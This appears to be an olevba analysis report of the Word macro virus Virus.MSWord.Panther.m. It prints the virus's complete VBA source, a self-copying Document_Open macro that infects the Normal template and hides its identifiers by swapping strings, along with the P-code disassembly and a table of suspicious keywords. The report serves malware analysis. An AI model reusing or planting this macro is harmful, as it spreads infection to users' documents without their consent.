olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Panther.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Panther.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    Dim code As String
    If Left$(NormalTemplate.Name, 8) <> "Document" Then
        Options.VirusProtection = True
        With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
            code = .Lines(1, .CountOfLines)
            ReplaceTemplate code, "Normal", "Template", "Happy", "Panther"
            ReplaceTemplate code, "Active", "Document", "Normal", "Template"
            ReplaceTemplate code, "Happy", "Panther", "Active", "Document"
            With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
                .DeleteLines 1, .CountOfLines
                .AddFromString code
            End With
        End With
        Options.SaveNormalPrompt = False
        If InStr("NormalTemplate", "Document") > 0 Then
        End If
    End If
End Sub
Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String)
    Dim index As Long, pre As String, post As String, preLen As Long
    
    pre = prepre + prepost
    post = postpre + postpost
    
    index = 1
    preLen = Len(pre)
    
    While InStr(index, target, pre) <> 0
        index = InStr(index, target, pre)
        target = Left(target, index - 1) + post + Mid$(target, index + preLen)
        index = index + 1
    Wend
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Panther.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3025 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Dim 
' 	VarDefn code (As String)
' Line #2:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #5:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St code 
' Line #6:
' 	Ld code 
' 	LitStr 0x0006 "Normal"
' 	LitStr 0x0008 "Template"
' 	LitStr 0x0005 "Happy"
' 	LitStr 0x0007 "Panther"
' 	ArgsCall ReplaceTemplate 0x0005 
' Line #7:
' 	Ld code 
' 	LitStr 0x0006 "Active"
' 	LitStr 0x0008 "Document"
' 	LitStr 0x0006 "Normal"
' 	LitStr 0x0008 "Template"
' 	ArgsCall ReplaceTemplate 0x0005 
' Line #8:
' 	Ld code 
' 	LitStr 0x0005 "Happy"
' 	LitStr 0x0007 "Panther"
' 	LitStr 0x0006 "Active"
' 	LitStr 0x0008 "Document"
' 	ArgsCall ReplaceTemplate 0x0005 
' Line #9:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #10:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #11:
' 	Ld code 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #12:
' 	EndWith 
' Line #13:
' 	EndWith 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LitStr 0x000E "NormalTemplate"
' 	LitStr 0x0008 "Document"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String))
' Line #20:
' 	Dim 
' 	VarDefn index (As Long)
' 	VarDefn pre (As String)
' 	VarDefn post (As String)
' 	VarDefn preLen (As Long)
' Line #21:
' Line #22:
' 	Ld prepre 
' 	Ld prepost 
' 	Add 
' 	St pre 
' Line #23:
' 	Ld postpre 
' 	Ld postpost 
' 	Add 
' 	St post 
' Line #24:
' Line #25:
' 	LitDI2 0x0001 
' 	St index 
' Line #26:
' 	Ld pre 
' 	FnLen 
' 	St preLen 
' Line #27:
' Line #28:
' 	Ld index 
' 	Ld target 
' 	Ld pre 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #29:
' 	Ld index 
' 	Ld target 
' 	Ld pre 
' 	FnInStr3 
' 	St index 
' Line #30:
' 	Ld target 
' 	Ld index 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld post 
' 	Add 
' 	Ld target 
' 	Ld index 
' 	Ld preLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St target 
' Line #31:
' 	Ld index 
' 	LitDI2 0x0001 
' 	Add 
' 	St index 
' Line #32:
' 	Wend 
' Line #33:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

